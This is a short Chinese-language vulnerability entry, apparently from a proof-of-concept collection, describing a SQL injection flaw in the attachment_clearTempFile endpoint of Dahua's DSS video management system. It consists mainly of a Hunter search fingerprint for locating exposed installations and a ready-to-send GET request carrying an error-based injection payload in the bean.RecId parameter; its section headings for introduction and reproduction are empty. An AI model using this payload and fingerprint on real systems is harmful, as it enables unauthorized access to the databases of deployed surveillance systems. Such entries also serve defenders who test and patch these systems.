# 大华DSS视频管理系统attachment_clearTempFile存在SQL注入漏洞

- **系统**：大华　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`hunter：`app.name=="Dahua 大华 DSS 视频管理系统"``
- **请求**：`GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,md5(1),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1`

**请求体 / payload**
```

```

**其他**
- 大华 DSS 视频管理系统attachment\_clearTempFile存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华 DSS 视频管理系统